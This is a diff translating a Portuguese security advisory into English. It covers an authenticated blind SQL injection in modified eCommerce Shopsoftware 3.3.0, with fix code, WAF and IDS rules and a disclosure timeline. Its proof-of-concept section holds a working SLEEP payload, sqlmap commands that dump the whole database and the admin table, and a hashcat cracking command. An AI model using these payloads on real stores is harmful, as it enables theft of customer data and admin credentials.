@@ -1,197 +1,196 @@
-# Advisory de Segurança — SQL Injection em modified eCommerce Shopsoftware 3.3.0
+# Security Advisory — SQL Injection in modified eCommerce Shopsoftware 3.3.0
 
-| Campo | Valor |
+| Field | Value |
 | :---- | :---- |
-| **Título** | SQL Injection Autenticado em `admin/categories.php` |
-| **Produto** | modified eCommerce Shopsoftware |
-| **Versão Afetada** | 3.3.0 (rev. r16825) — última versão disponível |
-| **Componente** | `admin/includes/classes/categories.php` → `edit_cross_sell()` |
-| **Tipo** | Blind Time-Based \+ Boolean-Based SQL Injection |
-| **CWE** | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements in an SQL Command |
+| **Title** | Authenticated SQL Injection in `admin/categories.php` |
+| **Product** | modified eCommerce Shopsoftware |
+| **Affected Version** | 3.3.0 (rev. r16825) — latest available version |
+| **Component** | `admin/includes/classes/categories.php` → `edit_cross_sell()` |
+| **Type** | Blind Time-Based \+ Boolean-Based SQL Injection |
+| **CWE** | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in an SQL Command |
 | **CAPEC** | [CAPEC-66](https://capec.mitre.org/data/definitions/66.html) — SQL Injection |
 | **CVSS 3.1 Score** | **8.8 (HIGH)** |
 | **Vector String** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
-| **CVE ID** | Pendente de Atribuição |
-| **Descoberto por** | Carlos Augusto Adriano Filho |
-| **Organização** | GOVERNSEC-IT Consulting / ACADI-TI Pós-Graduação Turma 10 — RA203 |
-| **Data de Descoberta** | 12 de Novembro de 2026 |
-| **Data de Publicação** | 12 de Novembro de 2026 |
-| **Versão Advisory** | 1.0 |
+| **CVE ID** | Pending Assignment |
+| **Discovered by** | Carlos Augusto Adriano Filho |
+| **Discovery Date** | November 12, 2026 |
+| **Publication Date** | November 12, 2026 |
+| **Advisory Version** | 1.0 |
 
 ---
 
-## Sumário
+## Table of Contents
 
-1. [Resumo Executivo](#1-resumo-executivo)  
-2. [Produto e Versão Afetada](#2-produto-e-versão-afetada)  
-3. [Descrição Técnica](#3-descrição-técnica)  
-4. [Impacto](#4-impacto)  
-5. [Classificação CVSS 3.1 e CWE](#5-classificação-cvss-31-e-cwe)  
-6. [Cenário de Exploração](#6-cenário-de-exploração)  
-7. [Evidência Técnica](#7-evidência-técnica)  
-8. [Prova de Conceito (PoC)](#8-prova-de-conceito-poc)  
-9. [Passos de Reprodução](#9-passos-de-reprodução)  
-10. [Mitigações Recomendadas](#10-mitigações-recomendadas)  
-11. [Código de Correção](#11-código-de-correção)  
-12. [Detecção e Monitoramento](#12-detecção-e-monitoramento)  
-13. [Timeline de Responsible Disclosure](#13-timeline-de-responsible-disclosure)  
-14. [Comunicação com o Vendor](#14-comunicação-com-o-vendor)  
-15. [Créditos](#15-créditos)  
-16. [Referências](#16-referências)  
-17. [Histórico de Revisões](#17-histórico-de-revisões)  
-18. [Aviso Legal](#18-aviso-legal)
-
----
-
-## 1\. Resumo Executivo
-
-Uma vulnerabilidade de **SQL Injection do tipo Blind Time-Based e Boolean-Based** foi identificada no painel administrativo do **modified eCommerce Shopsoftware 3.3.0**, especificamente no endpoint `POST /admin/categories.php?action=edit_crossselling`.
-
-Os parâmetros **`ids[]`** e **`current_product_id`** são inseridos diretamente em consultas SQL sem qualquer sanitização, tipagem ou uso de *prepared statements*. Um atacante autenticado como administrador pode explorar esta falha para **exfiltrar todo o conteúdo do banco de dados**, incluindo credenciais de administradores (hashes bcrypt), dados pessoais de clientes (PII) e informações de pedidos e pagamentos.
-
-O CVSS 3.1 calculado é **8.8 (HIGH)**, refletindo impacto total em Confidencialidade, Integridade e Disponibilidade.
+1. [Executive Summary](#1-executive-summary)  
+2. [Affected Product and Version](#2-affected-product-and-version)  
+3. [Technical Description](#3-technical-description)  
+4. [Impact](#4-impact)  
+5. [CVSS 3.1 and CWE Classification](#5-cvss-31-and-cwe-classification)  
+6. [Exploitation Scenario](#6-exploitation-scenario)  
+7. [Technical Evidence](#7-technical-evidence)  
+8. [Proof of Concept (PoC)](#8-proof-of-concept-poc)  
+9. [Reproduction Steps](#9-reproduction-steps)  
+10. [Recommended Mitigations](#10-recommended-mitigations)  
+11. [Fix Code](#11-fix-code)  
+12. [Detection and Monitoring](#12-detection-and-monitoring)  
+13. [Responsible Disclosure Timeline](#13-responsible-disclosure-timeline)  
+14. [Vendor Communication](#14-vendor-communication)  
+15. [Credits](#15-credits)  
+16. [References](#16-references)  
+17. [Revision History](#17-revision-history)  
+18. [Legal Disclaimer](#18-legal-disclaimer)
 
 ---
 
-## 2\. Produto e Versão Afetada
+## 1\. Executive Summary
 
-| Campo | Detalhe |
+A **Blind Time-Based and Boolean-Based SQL Injection** vulnerability was identified in the administrative panel of **modified eCommerce Shopsoftware 3.3.0**, specifically at the endpoint `POST /admin/categories.php?action=edit_crossselling`.
+
+The parameters **`ids[]`** and **`current_product_id`** are inserted directly into SQL queries without any sanitization, type casting, or use of prepared statements. An authenticated administrator can exploit this flaw to **exfiltrate the entire database**, including administrator credentials (bcrypt hashes), customer personally identifiable information (PII), and order and payment data.
+
+The calculated CVSS 3.1 score is **8.8 (HIGH)**, reflecting full impact on Confidentiality, Integrity, and Availability.
+
+---
+
+## 2\. Affected Product and Version
+
+| Field | Detail |
 | :---- | :---- |
-| **Produto** | modified eCommerce Shopsoftware (modified-shop) |
-| **Versão** | 3.3.0 — revisão r16825 (última versão pública disponível) |
-| **Linguagem** | PHP 8.1.x |
-| **Banco de Dados** | MariaDB 10.11 / MySQL |
-| **Servidor Web** | Apache 2.4.x |
-| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
-| **Arquivo Vulnerável** | `admin/includes/classes/categories.php` |
-| **Entrada (Entry Point)** | `admin/categories.php` |
-| **Versão Corrigida** | ⚠️ Nenhuma — sem patch disponível na data deste advisory |
+| **Product** | modified eCommerce Shopsoftware (modified-shop) |
+| **Version** | 3.3.0 — revision r16825 (latest publicly available version) |
+| **Language** | PHP 8.1.x |
+| **Database** | MariaDB 10.11 / MySQL |
+| **Web Server** | Apache 2.4.x |
+| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
+| **Vulnerable File** | `admin/includes/classes/categories.php` |
+| **Entry Point** | `admin/categories.php` |
+| **Fixed Version** | ⚠️ None — no patch available as of this advisory's publication date |
 
 ---
 
-## 3\. Descrição Técnica
+## 3\. Technical Description
 
-O painel administrativo expõe a funcionalidade de Cross-Selling via `action=edit_crossselling`. Ao processar a requisição, o controlador invoca o método `edit_cross_sell()` localizado em `admin/includes/classes/categories.php`.
+The administrative panel exposes the Cross-Selling management functionality via `action=edit_crossselling`. When processing the request, the controller invokes the `edit_cross_sell()` method located in `admin/includes/classes/categories.php`.
 
-O parâmetro `ids[]` é lido de `$_REQUEST` e iterado sem qualquer cast para inteiro ou chamada à função `xtc_db_input()`. O valor bruto de `$pID` é concatenado diretamente na query SQL.
+The `ids[]` parameter is read from `$_REQUEST` and iterated without any integer cast or call to the `xtc_db_input()` function. The raw value of `$pID` is concatenated directly into the SQL query.
 
-### Código Vulnerável
+### Vulnerable Code
 
 ```php
-// admin/includes/classes/categories.php — método edit_cross_sell()
-// $pID vem de $_REQUEST['ids'][] SEM cast (int) NEM xtc_db_input()
+// admin/includes/classes/categories.php — method edit_cross_sell()
+// $pID comes from $_REQUEST['ids'][] WITHOUT (int) cast OR xtc_db_input()
 
 foreach ($_REQUEST['ids'] as $pID) {
     $check_query = xtc_db_query(
         "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
         " WHERE products_id = '" . $cross_data['current_product_id'] . "'" .
-        " AND xsell_id = '" . $pID . "'"  // ← INJEÇÃO AQUI
+        " AND xsell_id = '" . $pID . "'"  // ← INJECTION HERE
     );
 
     if (xtc_db_num_rows($check_query) == 0) {
         xtc_db_query(
             "INSERT INTO " . TABLE_PRODUCTS_XSELL .
             " (products_id, xsell_id, xsell_grp_name_id) VALUES (" .
-            "'" . $cross_data['current_product_id'] . "'," .  // ← INJEÇÃO
-            "'" . $pID . "', '0')"                            // ← INJEÇÃO
+            "'" . $cross_data['current_product_id'] . "'," .  // ← INJECTION
+            "'" . $pID . "', '0')"                            // ← INJECTION
         );
     }
 }
 ```
 
-> **Nota:** O parâmetro `current_product_id` também é injetado diretamente nas mesmas queries via `$cross_data`, preenchido sem sanitização a partir de `$_REQUEST`.
+> **Note:** The `current_product_id` parameter is also injected directly into the same queries via `$cross_data`, which is populated without sanitization from `$_REQUEST`.
 
 ---
 
-## 4\. Impacto
+## 4\. Impact
 
-| Dimensão | Nível | Descrição |
+| Dimension | Level | Description |
 | :---- | :---- | :---- |
-| **Confidencialidade** | 🔴 HIGH | Extração completa do banco: hashes bcrypt, PII de clientes, histórico de pedidos |
-| **Integridade** | 🔴 HIGH | Modificação/exclusão de registros via stacked queries ou UPDATE/DELETE injetados |
-| **Disponibilidade** | 🔴 HIGH | DoS via queries pesadas (`BENCHMARK`, `SLEEP` em loop) ou corrupção de dados críticos |
+| **Confidentiality** | 🔴 HIGH | Full database extraction: bcrypt hashes, customer PII, order history |
+| **Integrity** | 🔴 HIGH | Record modification/deletion via stacked queries or injected UPDATE/DELETE |
+| **Availability** | 🔴 HIGH | DoS via heavy queries (`BENCHMARK`, `SLEEP` in a loop) or critical data corruption |
 
-### Dados Expostos
+### Exposed Data
 
-- **Tabela `administrators`**: login e hash bcrypt da senha de administradores  
-- **Tabela `customers`**: nome, e-mail, endereço, telefone, data de nascimento  
-- **Tabela `orders`**: histórico de pedidos, valores, status de pagamento  
-- **Tabela `configuration`**: chaves de API, configurações de pagamento (PayPal, etc.)
+- **`administrators` table**: admin login usernames and bcrypt password hashes  
+- **`customers` table**: full name, e-mail, address, phone number, date of birth  
+- **`orders` table**: order history, amounts, payment status  
+- **`configuration` table**: API keys, payment gateway settings (PayPal, etc.)
 
 ---
 
-## 5\. Classificação CVSS 3.1 e CWE
+## 5\. CVSS 3.1 and CWE Classification
 
-### Score Base: `8.8 (HIGH)`
+### Base Score: `8.8 (HIGH)`
 
 ```
 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
 ```
 
-| Métrica | Valor | Justificativa |
+| Metric | Value | Rationale |
 | :---- | :---- | :---- |
-| **Attack Vector (AV)** | Network | Exploração via HTTP sobre rede |
-| **Attack Complexity (AC)** | Low | Sem condições especiais de acesso |
-| **Privileges Required (PR)** | Low | Requer apenas conta de administrador da loja |
-| **User Interaction (UI)** | None | Completamente automatizável |
-| **Scope (S)** | Unchanged | Impacto limitado ao escopo da aplicação/DB |
-| **Confidentiality (C)** | High | Acesso a todos os dados |
-| **Integrity (I)** | High | Modificação de dados |
-| **Availability (A)** | High | Possibilidade de DoS |
+| **Attack Vector (AV)** | Network | Exploitation over HTTP across the network |
+| **Attack Complexity (AC)** | Low | No special access conditions required |
+| **Privileges Required (PR)** | Low | Requires only a valid store administrator account |
+| **User Interaction (UI)** | None | Fully automatable — no victim interaction needed |
+| **Scope (S)** | Unchanged | Impact limited to the application/database scope |
+| **Confidentiality (C)** | High | Access to all data |
+| **Integrity (I)** | High | Data modification capability |
+| **Availability (A)** | High | Possibility of DoS |
 
 **CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in an SQL Command  
 **CAPEC:** [CAPEC-66](https://capec.mitre.org/data/definitions/66.html) — SQL Injection
 
-> **Calculadora:** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+> **Calculator:** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
 
 ---
 
-## 6\. Cenário de Exploração
+## 6\. Exploitation Scenario
 
 ```
-[ Atacante Admin ] → POST /admin/categories.php?action=edit_crossselling
-                          ids[]=1' AND SLEEP(5)-- -
-                          current_product_id=1
-                              ↓
-                     [ PHP: edit_cross_sell() ]
-                              ↓
-                     xtc_db_query("... AND xsell_id = '1' AND SLEEP(5)-- -'")
-                              ↓
-                     [ MariaDB: delay 5s → confirmed ]
-                              ↓
-                     [ sqlmap: extrai DB, hashes, PII ]
+[ Authenticated Admin ] → POST /admin/categories.php?action=edit_crossselling
+                               ids[]=1' AND SLEEP(5)-- -
+                               current_product_id=1
+                                   ↓
+                          [ PHP: edit_cross_sell() ]
+                                   ↓
+                          xtc_db_query("... AND xsell_id = '1' AND SLEEP(5)-- -'")
+                                   ↓
+                          [ MariaDB: 5s delay → confirmed ]
+                                   ↓
+                          [ sqlmap: extracts DB, hashes, PII ]
 ```
 
-### Fluxo de Ataque
+### Attack Flow
 
-1. **Autenticação** — Acesso ao painel `/admin/` com credenciais válidas (força bruta, credential stuffing ou conta comprometida). Cookie `MODsid` é emitido.  
-2. **Navegação** — Acesso a `categories.php`, seleção de categoria, abertura da aba Cross-Selling de um produto.  
-3. **Interceptação** — Captura da requisição `POST action=edit_crossselling` via proxy (Burp Suite).  
-4. **Injeção** — Manipulação de `ids[]` ou `current_product_id` com payload SQL.  
-5. **Extração** — Uso de `sqlmap` para extração automatizada de todo o banco de dados.  
-6. **Pós-Exploração** — Cracking offline dos hashes bcrypt \+ acesso à conta admin.
+1. **Authentication** — Access to `/admin/` with valid credentials (brute force, credential stuffing, or compromised account). `MODsid` cookie is issued.  
+2. **Navigation** — Access to `categories.php`, category selection, opening the Cross-Selling tab of a product.  
+3. **Interception** — Capturing the `POST action=edit_crossselling` request via proxy (Burp Suite).  
+4. **Injection** — Manipulating `ids[]` or `current_product_id` with an SQL payload.  
+5. **Extraction** — Using `sqlmap` for automated extraction of the entire database.  
+6. **Post-Exploitation** — Offline cracking of bcrypt hashes \+ admin account takeover.
 
 ---
 
-## 7\. Evidência Técnica
+## 7\. Technical Evidence
 
-| Campo | Valor Confirmado |
+| Field | Confirmed Value |
 | :---- | :---- |
-| **URL Alvo** | `http://[TARGET]/admin/categories.php` |
-| **Método** | `POST` |
+| **Target URL** | `http://[TARGET]/admin/categories.php` |
+| **Method** | `POST` |
 | **Action** | `edit_crossselling` |
-| **Parâmetros Vulneráveis** | `ids[]` · `current_product_id` |
+| **Vulnerable Parameters** | `ids[]` · `current_product_id` |
 | **DBMS** | MariaDB \>= 10.11 |
-| **Usuário DB** | `modified@%` |
+| **DB User** | `modified@%` |
 | **Schema** | `modified` |
 | **PHP** | 8.1.34 |
 | **Apache** | 2.4.65 |
-| **Técnica** | Time-Based Blind (T) \+ Boolean-Based Blind (B) |
+| **Technique** | Time-Based Blind (T) \+ Boolean-Based Blind (B) |
 | **`current_user()`** | `modified@%` ✅ |
 | **`database()`** | `modified` ✅ |
-| **Hash extraído** | `$2y$10$...` (bcrypt, administrador) ✅ |
+| **Extracted Hash** | `$2y$10$...` (bcrypt, administrator) ✅ |
 
-### Output sqlmap
+### sqlmap Output
 
 ```
 [*] starting @ 02:15:00 /2026-11-12/
@@ -225,14 +224,14 @@ current database: 'modified'
 
 ---
 
-## 8\. Prova de Conceito (PoC)
+## 8\. Proof of Concept (PoC)
 
-> ⚠️ **Uso exclusivo em ambientes autorizados. Testes em produção sem autorização são ilegais.**
+> ⚠️ **For use in authorized environments only. Testing on production systems without authorization is illegal.**
 
-### 8.1 — Teste Manual (Time-Based, delay esperado: \~5s)
+### 8.1 — Manual Test (Time-Based, expected delay: \~5s)
 
 ```sh
-# Substitua MODsid pelo cookie de sessão admin válido
+# Replace MODsid with a valid admin session cookie
 curl -s -X POST \
   'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
   -H 'Cookie: MODsid=<SESSION_COOKIE>' \
@@ -240,13 +239,13 @@ curl -s -X POST \
   --data-urlencode "current_product_id=1" \
   --data-urlencode "ids[]=1' AND SLEEP(5)-- -"
 
-# Resposta esperada: delay de ~5 segundos confirma a injeção
+# Expected result: ~5 second delay confirms the injection
 ```
 
-### 8.2 — Automação com sqlmap
+### 8.2 — Automation with sqlmap
 
 ```sh
-# Enumeração de bancos de dados
+# Database enumeration
 sqlmap -u 'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
   --method POST \
   --data 'special=add_entries&current_product_id=1&ids[]=1*' \
@@ -257,17 +256,17 @@ sqlmap -u 'http://[TARGET]/admin/categories.php?action=edit_crossselling' \
   --dbs \
   --batch
 
-# Dump completo da database 'modified'
+# Full dump of the 'modified' database
 sqlmap [...] -D modified --dump-all --batch
 
-# Extração de hashes de administradores
+# Extract administrator password hashes only
 sqlmap [...] -D modified -T administrators --dump --batch
 ```
 
-### 8.3 — Extração de Hashes (Pós-Exploração)
+### 8.3 — Hash Extraction (Post-Exploitation)
 
 ```sh
-# Cracking offline do hash bcrypt extraído
+# Offline cracking of extracted bcrypt hash
 # hashcat mode 3200 = bcrypt $2*$
 echo '$2y$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' > hash.txt
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
@@ -275,29 +274,29 @@ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 9\. Passos de Reprodução
+## 9\. Reproduction Steps
 
-**Pré-requisitos:** Conta de administrador válida no painel modificado. Ferramenta de intercepção (Burp Suite) ou `curl`.
+**Prerequisites:** Valid administrator account in the admin panel. Interception tool (Burp Suite) or `curl`.
 
-1. **Login** — Acessar `http://[TARGET]/admin/` → preencher credenciais → capturar o cookie `MODsid` da resposta.  
+1. **Login** — Access `http://[TARGET]/admin/` → fill in credentials → capture the `MODsid` cookie from the response.  
      
-2. **Navegar para Categorias** — Acessar `http://[TARGET]/admin/categories.php` → selecionar uma categoria → clicar em **Edit**.  
+2. **Navigate to Categories** — Access `http://[TARGET]/admin/categories.php` → select a category → click **Edit**.  
      
-3. **Localizar Cross-Selling** — Na página de edição da categoria, localizar a aba ou seção de **Cross-Selling** de um produto.  
+3. **Locate Cross-Selling** — On the category edit page, locate the **Cross-Selling** tab or section of a product.  
      
-4. **Interceptar a Requisição** — Com Burp Suite em modo intercept, clicar em **Salvar**. A requisição `POST` para `action=edit_crossselling` será capturada.  
+4. **Intercept the Request** — With Burp Suite in intercept mode, click **Save**. The `POST` request to `action=edit_crossselling` will be captured.  
      
-5. **Injetar Payload Time-Based** — Modificar `ids[]` para:
+5. **Inject Time-Based Payload** — Modify `ids[]` to:
 
 ```
 1' AND SLEEP(5)-- -
 ```
 
-   Encaminhar e medir o tempo de resposta. Delay ≥ 5s confirma a vulnerabilidade.
+   Forward the request and measure the response time. A delay ≥ 5s confirms the vulnerability.
 
    
 
-6. **Automatizar** — Salvar a requisição como `req.txt` no Burp e executar:
+6. **Automate** — Save the request as `req.txt` in Burp and run:
 
 ```sh
 sqlmap -r req.txt --technique=TBQ --dbs --batch
@@ -305,48 +304,48 @@ sqlmap -r req.txt --technique=TBQ --dbs --batch
 
 ---
 
-## 10\. Mitigações Recomendadas
+## 10\. Recommended Mitigations
 
-### Correção Imediata
+### Immediate Fix
 
-| Prioridade | Ação |
+| Priority | Action |
 | :---- | :---- |
-| 🔴 **Crítica** | Cast `(int)` obrigatório em todos os parâmetros ID |
-| 🔴 **Crítica** | Validação server-side antes de qualquer uso em query |
-| 🟠 **Alta** | Migração para PDO com prepared statements |
-| 🟡 **Média** | Revisão de todas as queries que usam `$_REQUEST/$_POST/$_GET` |
+| 🔴 **Critical** | Mandatory `(int)` cast on all ID parameters |
+| 🔴 **Critical** | Server-side validation before any query use |
+| 🟠 **High** | Migration to PDO with prepared statements |
+| 🟡 **Medium** | Audit of all queries using `$_REQUEST/$_POST/$_GET` |
 
-### Recomendações Blue Team / DevSecOps
+### Blue Team / DevSecOps Recommendations
 
-- **Prepared Statements** — Migrar TODAS as queries dinâmicas para PDO parametrizado. Eliminar concatenação de strings em SQL.  
-- **Whitelist de Tipos** — Validar parâmetros numéricos com `filter_var($id, FILTER_VALIDATE_INT)` antes de qualquer uso.  
-- **WAF** — Configurar regra no ModSecurity/NAXSI para bloquear palavras-chave SQL em campos de formulário admin (`SLEEP`, `BENCHMARK`, `UNION SELECT`).  
-- **Mínimo Privilégio (DB)** — O usuário `modified@%` não deve ter acesso à tabela `administrators`. Separar contas de leitura/escrita por schema.  
-- **SAST** — Executar PHP\_CodeSniffer \+ PHPCS-Security-Audit em todos os arquivos que processam entrada do usuário.  
-- **MFA no Admin** — Implementar autenticação multi-fator no painel, aumentando o custo de obtenção do pré-requisito `PR:L`.
+- **Prepared Statements** — Migrate ALL dynamic queries to parameterized PDO. Eliminate string concatenation in SQL.  
+- **Type Whitelisting** — Validate that numeric parameters receive only integers via `filter_var($id, FILTER_VALIDATE_INT)` before any use.  
+- **WAF** — Configure a ModSecurity/NAXSI rule to block SQL keywords in admin form fields (`SLEEP`, `BENCHMARK`, `UNION SELECT`).  
+- **Least Privilege (DB)** — The `modified@%` database user should not have read access to the `administrators` table. Use separate accounts per schema with read/write separation.  
+- **SAST** — Run PHP\_CodeSniffer \+ PHPCS-Security-Audit on all files that process user input and build queries.  
+- **Multi-Factor Authentication** — Implement MFA for the admin panel, increasing the cost of obtaining the `PR:L` prerequisite.
 
 ---
 
-## 11\. Código de Correção
+## 11\. Fix Code
 
 ```php
 // ──────────────────────────────────────────────────────────────
-// VULNERÁVEL — admin/includes/classes/categories.php
+// VULNERABLE — admin/includes/classes/categories.php
 // ──────────────────────────────────────────────────────────────
 foreach ($_REQUEST['ids'] as $pID) {
     $check_query = xtc_db_query(
         "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
         " WHERE products_id = '" . $cross_data['current_product_id'] . "'" .
-        " AND xsell_id = '" . $pID . "'"   // sem sanitização
+        " AND xsell_id = '" . $pID . "'"   // no sanitization
     );
 }
 
 // ──────────────────────────────────────────────────────────────
-// CORRIGIDO — Opção 1: cast inteiro (correção mínima)
+// FIXED — Option 1: integer cast (minimum fix)
 // ──────────────────────────────────────────────────────────────
 foreach ($_REQUEST['ids'] as $pID) {
-    $pID = (int) $pID;                                           // CORREÇÃO
-    $cid = (int) $cross_data['current_product_id'];             // CORREÇÃO
+    $pID = (int) $pID;                                           // FIX
+    $cid = (int) $cross_data['current_product_id'];             // FIX
 
     $check_query = xtc_db_query(
         "SELECT * FROM " . TABLE_PRODUCTS_XSELL .
@@ -356,13 +355,13 @@ foreach ($_REQUEST['ids'] as $pID) {
 }
 
 // ──────────────────────────────────────────────────────────────
-// CORRIGIDO — Opção 2: função nativa do framework
+// FIXED — Option 2: framework native escape function
 // ──────────────────────────────────────────────────────────────
-$pID = xtc_db_input($pID);                    // wrapper de mysqli_real_escape_string
+$pID = xtc_db_input($pID);                    // wrapper for mysqli_real_escape_string
 $cid = xtc_db_input($cross_data['current_product_id']);
 
 // ──────────────────────────────────────────────────────────────
-// RECOMENDADO — Opção 3: PDO com prepared statements
+// RECOMMENDED — Option 3: PDO with prepared statements
 // ──────────────────────────────────────────────────────────────
 $stmt = $pdo->prepare(
     'SELECT * FROM products_xsell WHERE products_id = :pid AND xsell_id = :xid'
@@ -370,7 +369,7 @@ $stmt = $pdo->prepare(
 $stmt->execute([':pid' => (int) $current_product_id, ':xid' => (int) $pID]);
 
 // ──────────────────────────────────────────────────────────────
-// Validação de whitelist completa (entrada do array ids[])
+// Full whitelist validation (ids[] array input)
 // ──────────────────────────────────────────────────────────────
 function validate_id_array(array $ids): array {
     return array_filter(array_map('intval', $ids), fn($v) => $v > 0);
@@ -387,21 +386,21 @@ if (empty($safe_ids) || $safe_cid === 0) {
 
 ---
 
-## 12\. Detecção e Monitoramento
+## 12\. Detection and Monitoring
 
-### 12.1 — Padrões no Access Log Apache
+### 12.1 — Apache Access Log Patterns
 
 ```sh
-# Detectar tentativas de SLEEP/BENCHMARK
+# Detect SLEEP/BENCHMARK attempts in logs
 grep -iE "(sleep\(|benchmark\(|waitfor|UNION.+SELECT|'\s*AND\s*'|'\s*OR\s*')" \
      /var/log/apache2/access.log
 
-# Filtrar POSTs para o endpoint vulnerável
+# Filter POST requests to the vulnerable endpoint
 grep 'POST /admin/categories.php' /var/log/apache2/access.log | \
   grep -i 'edit_crossselling'
 ```
 
-### 12.2 — Regra Suricata IDS
+### 12.2 — Suricata IDS Rule
 
 ```
 alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
@@ -428,15 +427,15 @@ SecRule REQUEST_URI "@contains /admin/categories.php" \
         SecRule ARGS_POST "@rx ['\"\x27\x22\x60]" ""
 ```
 
-### 12.4 — Query MySQL/MariaDB (Auditoria de Lentidão)
+### 12.4 — MySQL/MariaDB Slow Query Log (Audit)
 
 ```sql
--- Habilitar slow query log para detectar SLEEP/BENCHMARK
+-- Enable slow query log to detect SLEEP/BENCHMARK
 SET GLOBAL slow_query_log = 'ON';
 SET GLOBAL long_query_time = 3;
 SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';
 
--- Consultar queries suspeitas no log de auditoria (MariaDB Audit Plugin)
+-- Query suspicious entries in the audit log (MariaDB Audit Plugin)
 SELECT event_time, user_host, query_time, sql_text
 FROM mysql.slow_log
 WHERE sql_text REGEXP 'SLEEP|BENCHMARK|WAIT'
@@ -445,46 +444,46 @@ ORDER BY event_time DESC;
 
 ---
 
-## 13\. Timeline de Responsible Disclosure
+## 13\. Responsible Disclosure Timeline
 
-| Data | Evento |
+| Date | Event |
 | :---- | :---- |
-| `2026-11-12` | Descoberta da vulnerabilidade durante análise de segurança — ambiente de laboratório controlado |
-| `2026-11-12` | Confirmação técnica via sqlmap: time-based blind (5s delay), `current_user()=modified@%`, hash admin extraído |
-| `2026-11-12` | Redação e publicação do Advisory de Segurança versão 1.0 |
-| `2026-11-12` | Notificação ao maintainer via GitHub Security Advisory / Issue |
-| `Pendente` | Aguardando resposta do vendor para coordenar publicação de patch |
-| `Pendente` | Solicitação de CVE ID em andamento via MITRE/NVD |
-| `TBD` | Publicação de patch pelo vendor (data a ser definida após coordenação) |
+| `2026-11-12` | Vulnerability discovered during security analysis — controlled lab environment |
+| `2026-11-12` | Technical confirmation via sqlmap: time-based blind (5s delay), `current_user()=modified@%`, admin hash extracted |
+| `2026-11-12` | Security Advisory version 1.0 written and published |
+| `2026-11-12` | Vendor notified via GitHub Security Advisory / Issue |
+| `Pending` | Awaiting vendor response to coordinate patch publication |
+| `Pending` | CVE ID request in progress via MITRE/NVD |
+| `TBD` | Vendor patch publication (date to be defined after coordination) |
 
-> Este advisory segue o processo de **Coordinated Vulnerability Disclosure (CVD)** conforme recomendado pelo CERT/CC e ISO/IEC 29147:2018.
+> This advisory follows the **Coordinated Vulnerability Disclosure (CVD)** process as recommended by CERT/CC and ISO/IEC 29147:2018.
 
 ---
 
-## 14\. Comunicação com o Vendor
+## 14\. Vendor Communication
 
-| Campo | Detalhe |
+| Field | Detail |
 | :---- | :---- |
 | **Vendor** | modified eCommerce Shopsoftware Community |
-| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
-| **Canal de Contato** | GitHub Security Advisories / Issues |
-| **Status** | Notificação enviada em 2026-11-12. Aguardando resposta. |
-| **SLA** | 90 dias para publicação coordenada (CVD Best Practices) |
+| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
+| **Contact Channel** | GitHub Security Advisories / Issues |
+| **Status** | Notification sent on 2026-11-12. Awaiting response. |
+| **SLA** | 90 days for coordinated publication (CVD Best Practices) |
 
 ---
 
-## 15\. Créditos
+## 15\. Credits
 
-| Campo | Detalhe |
+| Field | Detail |
 | :---- | :---- |
-| **Pesquisador** | Carlos Augusto Adriano Filho |
-| **Cargo** | Analista Red Team Sênior |
-| **Área** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
-| **Metodologias** | OWASP Testing Guide · PTES · NIST SP 800-115 |
+| **Researcher** | Carlos Augusto Adriano Filho |
+| **Role** | Senior Red Team Analyst |
+| **Focus Areas** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
+| **Methodologies** | OWASP Testing Guide · PTES · NIST SP 800-115 |
 
 ---
 
-## 16\. Referências
+## 16\. References
 
 - [CWE-89 — Improper Neutralization of Special Elements in SQL Command](https://cwe.mitre.org/data/definitions/89.html)  
 - [CAPEC-66 — SQL Injection](https://capec.mitre.org/data/definitions/66.html)  
@@ -499,21 +498,20 @@ ORDER BY event_time DESC;
 
 ---
 
-## 17\. Histórico de Revisões
+## 17\. Revision History
 
-| Versão | Data | Autor | Descrição |
+| Version | Date | Author | Description |
 | :---- | :---- | :---- | :---- |
-| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Publicação inicial |
+| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Initial publication |
 
 ---
 
-## 18\. Aviso Legal
+## 18\. Legal Disclaimer
 
-> **AVISO LEGAL:** Este advisory foi elaborado exclusivamente para fins educacionais e de segurança, em ambiente de laboratório controlado, com autorização explícita. As técnicas e ferramentas descritas são destinadas a profissionais de segurança da informação para fins de teste de penetração autorizado e pesquisa de vulnerabilidades.  
+> **LEGAL DISCLAIMER:** This advisory was prepared exclusively for educational and security purposes, in a controlled laboratory environment, with explicit authorization. The techniques and tools described are intended for security professionals for authorized penetration testing and vulnerability research purposes only.  
 >   
